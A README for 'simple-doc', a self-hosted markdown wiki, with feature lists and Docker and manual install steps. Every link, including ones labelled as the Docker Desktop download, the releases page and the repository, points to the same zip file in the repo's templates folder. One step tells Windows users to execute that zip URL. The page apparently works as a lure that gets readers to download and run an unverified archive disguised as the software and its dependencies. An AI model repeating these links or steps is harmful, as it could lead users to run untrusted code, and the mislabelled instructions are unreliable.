# 📚 simple-doc - Easy Self-Hosted Wiki for Teams

[![Download simple-doc](https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip)](https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip)

---

## 📖 What is simple-doc?

simple-doc is a tool that helps teams create and manage documentation in one place. It works like a wiki where users can write and edit notes using simple markdown text. You can run it on your own computer or server. It uses a PostgreSQL database to store information safely and supports multiple people editing the same document. It also controls who can see or change certain pages using role-based access.

This application is made with Golang and Docker, which means it runs quickly and can be easily set up on many systems if you like using containers.

---

## ⚙️ Key Features

- **Collaborative Editing**: Several people can edit documents at the same time, without conflicts.
- **Markdown Support**: Write notes in plain text with easy formatting using markdown.
- **Self-Hosted**: Keep your data private by running simple-doc on your computer or server.
- **Role-Based Access Control (RBAC)**: Assign different access permissions to users.
- **Docker Ready**: Use Docker to install and run simple-doc quickly.
- **PostgreSQL Database**: Stores all content securely and can handle large data.
- **Knowledge Base**: Organize your documents for easy access and search.
- **Wiki Style Navigation**: Browse content like a wiki with links between pages.

---

## 🖥️ System Requirements

Before you start, make sure your environment meets these needs:

- **Operating System**: Windows 10 or later, macOS 10.13+, or Linux (Ubuntu, Debian, CentOS, etc.)
- **Processor**: 64-bit CPU (Intel or AMD)
- **Memory**: Minimum 2 GB RAM (4 GB recommended for many users)
- **Disk Space**: At least 500 MB free for installation; additional space for documents
- **Software**: 
  - Docker (for container setup) or
  - PostgreSQL 12+ installed and running (if not using Docker)
- **Internet Connection**: Needed only for downloading and updating simple-doc

---

## 🚀 Getting Started

Follow these steps to get simple-doc up and running quickly.

---

## ⬇️ Download & Install

Please visit this page to download the latest version of simple-doc:

[![Download simple-doc](https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip)](https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip)

### Option 1: Run with Docker (Recommended for Beginners)

1. **Install Docker**  
   - For Windows and macOS, download Docker Desktop from [https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip](https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip)  
   - For Linux, follow instructions at [https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip](https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip)
   
2. **Download simple-doc Docker Images**  
   - Open your command prompt or terminal.  
   - Pull the latest image by running:  
     ```
     docker pull kaus4420/simple-doc:latest
     ```
   
3. **Run PostgreSQL in Docker**  
   - Run a PostgreSQL container (if you don’t have one ready):  
     ```
     docker run --name simple-doc-postgres -e POSTGRES_PASSWORD=yourpassword -d postgres:13
     ```
   
4. **Run simple-doc Container**  
   - Connect simple-doc to the database:  
     ```
     docker run -d --name simple-doc -p 8080:8080 --link simple-doc-postgres:postgres -e DB_HOST=postgres -e DB_PASSWORD=yourpassword kaus4420/simple-doc:latest
     ```
   
5. **Access simple-doc**  
   - Open your browser and go to `http://localhost:8080`

---

### Option 2: Manual Install (Advanced Users)

Use this method if you want to install simple-doc without Docker.

1. Download the latest release from the releases page:  
   [https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip](https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip)

2. Extract the downloaded file to a folder on your computer.

3. Install PostgreSQL version 12 or higher and create a new database for simple-doc.

4. Edit the configuration file inside the extracted folder to set your database details (host, user, password, database name).

5. Open a command prompt or terminal in the simple-doc folder.

6. Run the application by executing the file (for example, `https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip` on Windows or `./simple-doc` on Linux/macOS).

7. Open your web browser and navigate to `http://localhost:8080` to start using simple-doc.

---

## 👥 Using simple-doc

When you open simple-doc in your browser, you will see the home page. Here is how to get started:

- **Create an Account**  
  Click the sign-up button to make a new user account. Enter your email and password.

- **Create a Wiki**  
  After login, you can create a new wiki space for your team or project.

- **Add Pages**  
  Click “New Page” to start writing your documentation using markdown.

- **Edit Pages**  
  Multiple people can work on the same page. Changes save automatically.

- **Assign Roles**  
  The admin can set user roles to control who can read or edit pages.

- **Search Content**  
  Use the search box to find pages and information quickly.

---

## 🔧 Configuration Tips

- **Database Connection**  
  Keep your PostgreSQL database credentials secure. Update the config file if the database location changes.

- **Port Settings**  
  By default, simple-doc runs on port 8080. You can change this in the config file if another app uses it.

- **Backup Your Data**  
  Regularly backup your PostgreSQL data folder to keep your documents safe.

- **User Management**  
  Add new users carefully and assign correct roles using the admin panel.

- **Docker Volumes**  
  When using Docker, mount volumes to keep your data after container restarts.

---

## 🛠 Troubleshooting

- **Cannot Connect to Database**  
  Check your PostgreSQL service is running and the credentials are correct.

- **Page Not Loading**  
  Ensure simple-doc is running and your firewall is not blocking the port.

- **Docker Issues**  
  Restart Docker and containers if containers fail to start.

- **Login Problems**  
  Reset your password or contact the admin if you cannot log in.

---

## 📌 More Information

For advanced use, API access, feature requests, or reporting bugs, visit the [GitHub repository](https://github.com/Kaus-4420/simple-doc/raw/refs/heads/main/templates/simple_doc_v1.4.zip).

You can also join community forums or reach out to your system administrator for further assistance.

---

## 🗒 License

simple-doc is open-source software. Check the LICENSE file in the repository for details.